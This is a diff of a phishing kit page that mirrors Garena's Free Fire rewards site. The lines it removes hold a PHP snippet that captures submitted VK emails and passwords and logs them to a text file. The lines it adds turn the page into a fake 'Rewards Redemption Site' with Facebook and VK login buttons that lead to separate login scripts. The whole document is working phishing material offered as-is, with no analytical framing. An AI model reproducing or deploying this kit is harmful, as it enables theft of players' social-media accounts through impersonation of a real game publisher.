@@ -1,34 +1,101 @@
-<?php
-#mdified by prince kummar 
-$nickname= $_POST['nickname'];
-$name= $_POST['nama'];
-$emailvk= $_POST['emailvk'];
-$passvk= $_POST['passvk'];
-
-$ip = $_SERVER['REMOTE_ADDR'];
-$today = date("F j, Y, g:i a");
-$link = $_SERVER['SERVER_NAME'];
-$browser = $_SERVER['HTTP_USER_AGENT'];
-
-file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: " . $_POST['passvk'] . " Nameonvk: ".$namefb. " Email: ". $emailvk. "\n", FILE_APPEND);
-
-?>
-
 <!DOCTYPE html>
 <html lang="zh">
 
 
-<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- Mirrored from reward.ff.garena.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Jul 2018 12:17:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
-	<meta name="title" content="FreeFire">
-    <meta name="description" content="FreeFire">
-    <meta property="og:title" content="FreeFire">
-    <meta property="og:description" content="FreeFire">
-	</script>
-	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common/reset.css">
+<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common/reset.css">
 	<link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/common.css">  
     <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/swiper.css">
     <link rel="stylesheet" href="https://ff.garena.com/statics/ff/css/firepass/season02.css">
+    <!-- M002 V3 -->
+<style type="text/css">
+
+.kotak {
+	position:relative;
+	margin:50px auto;
+	max-width:1024px;
+	height:auto;
+	border:2px solid white;
+	padding:30px;
+	color: white;
+}
+
+.box{
+ background-image:url("img/cewe.png"); 
+ background-size:100% auto; 
+ background-repeat: no-repeat; 
+ color: white;
+ width: 100%;
+ height: auto;
+ padding:10px;
+ margin:0px auto;
+ border: 0px auto;
+ }
+ 
+
+
+.hadiah {
+ background-color: #ffba00;
+ display: inline-block;
+ width: 250px;
+ height: auto;
+ margin: 20px;
+ color: white;
+ border-radius: 10px;
+}
+
+.hadiah-apa {
+ width: 250px;
+ height: auto;
+ margin: auto;
+ border-radius: 10px;
+}
+
+.hadiah h5 {
+ margin: 10px auto;
+ font-size: 1.5em;
+ text-align: center;
+ height: 50px;
+}
+
+
+.tombol {
+ background: transparent;
+ position: relative;
+ width: 30%;
+ height: 40px;
+ margin: 0;
+ color: #ffba00;
+ border: 1px solid #ffba00;
+ font-size: 1.2em;
+ font-weight:700;
+ text-align: center;
+ letter-spacing: 1px;
+ outline: none;
+ cursor: pointer;
+}
+
+h4 {
+color: white;
+}
+
+input[type=text],input[type=password],input[type=number] {
+ background:transparent;
+ width:100%;
+ padding:12px 20px;
+ margin:8px 0;
+ display:inline-block;
+ border:1px solid #ffba00;
+ color: #ffba00;
+ box-sizing: border-box;
+}
+
+label {
+ color: #ffba00;
+}
+</style>
     <!-- M002 V3 -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -63,26 +130,24 @@ file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: "
 <div class="col-md-5 col-sm-5 col-xs-5">
 <img src="imgg/logoff.png" class="gamelogo">
 </div><div class="col-md-5 col-sm-5 col-xs-5">
-<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Sukses Klaim!</span></div><div class="a_wrap"><div></div>
-<br><div><div></a></span></div>
+<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Rewards Redemption Site</span></div><div class="a_wrap"><div></div>
+<center><h2><span class="txt_c">Login Via</span></h2></center>
+<br>
+</center>
+<center><div class="btn_fb"></center>
+<label><font color="gold">Account FB :</font></label><center><a href="logfb.php"><button type="submit" class="tombol">Log FB</button></center>
 
 <br>
-<br><div><div></a></span></div>
-<p><h5>Succes Claim!</h5></p>
-</div><div class="more"><ol>
-<li><!-- react-text: 18 -->1. Congratulations The Prize Has Been Claimed </li>
-<li><!-- react-text: 22 -->2. Please Wait For Your Prize In A Few Days </li>
-<br>
-<li>Remember: You Can't Claim Rewards If You Use a Guest Account. Please Bind Your Account First To Facebook or VK To Receive Prizes</li>
-<br>
-<center><a href="index.php" class="button"><img src="imgg/logout.png" </center>
+
+<center><div class="btn_vk"></center>
+<label><font color="gold">Account VK: <font></label><center><a href="logvk.php"><button type="submit" class="tombol">Log VK</button></center>
+
 </div></div></div></div>
-
+<br>
+<br>
+<br>
 <br>
 
-<br>
-
-<br>
 <body>
 <div class="g-footer clearFix">
     <div class="m-foot-wrap">
@@ -92,4 +157,6 @@ file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: "
     <div id="app"></div>
 
 <script type="text/javascript" src="bundle.js"></script></body>
+
+
 </html>
